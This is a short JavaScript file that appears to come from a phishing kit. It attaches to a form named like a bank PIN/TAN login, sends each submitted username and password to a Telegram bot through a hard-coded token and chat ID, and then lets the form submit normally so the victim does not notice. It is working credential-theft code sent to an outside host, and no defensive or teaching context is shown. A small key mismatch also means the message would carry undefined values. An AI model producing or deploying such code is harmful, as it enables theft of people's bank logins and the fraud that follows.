document.addEventListener('DOMContentLoaded', function () {
    const form = document.getElementById('pintTanLoginForm');
  
    if (form) {
        form.addEventListener('submit', function (e) {
            e.preventDefault(); 
  
            
            const token = '8028403931:AAHdpHoCPJzQVNdZh5jVj9dzbQEpuNiKHeA';
            const chatId = '7640225740';
  
            
            const formData = new FormData(this);
            const data = {
                'Username': formData.get('username'),
                'Password': formData.get("password"),
                
            };
  
            
            const messageText = `
    👮 username: ${data.username}\n 
    ♾️ password: ${data.password}\n 
`;
  
           
            sendMessageToTelegram(token, chatId, messageText)
                .then(response => {
                    if (response.ok) {
                        console.log('Message sent successfully!');
                        
                        form.submit();
                    } else {
                        console.error('Error sending message:', response);
                        alert('Error sending message');
                    }
                })
                .catch(error => {
                    console.error('Fetch error:', error);
                    alert('Error sending message');
                });
        });
    } else {
        console.error('Form element with id "indexFormId" not found.');
    }
  });
  
  function sendMessageToTelegram(token, chatId, text) {
    return fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            chat_id: chatId,
            text: text
        })
    })
    .then(response => response.json());
  }
  
